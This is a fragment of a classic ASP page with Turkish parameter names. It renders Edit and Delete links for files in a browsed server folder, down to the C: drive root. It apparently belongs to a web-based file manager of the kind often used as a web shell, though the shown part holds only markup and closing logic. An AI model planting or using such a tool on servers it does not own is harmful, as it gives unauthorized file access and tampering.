    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
      <tr>
        <td width="100%" bgcolor="#D6D6D6" no wrap
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a style="text-decoration: none" target="_self" href="?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>">
        <font color="#000000">Edit</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="20">
      <tr>
        <td width="100%" bgcolor="#D6D6D6" no wrap
        onmouseover="this.style.background='#ACACAC'"
        onmouseout="this.style.background='#D6D6D6'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>" style="text-decoration: none">
        <font color="#000000">Sil</font></a></font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>

<% Next %>



<%
if aktifklas=("C:\") then aktifklas=("C:")
%>


<%
end if
%>



<%
end if
%>


<%
end if
%>


<%
end if
%>

<%
end if
%>
</body>
</html>
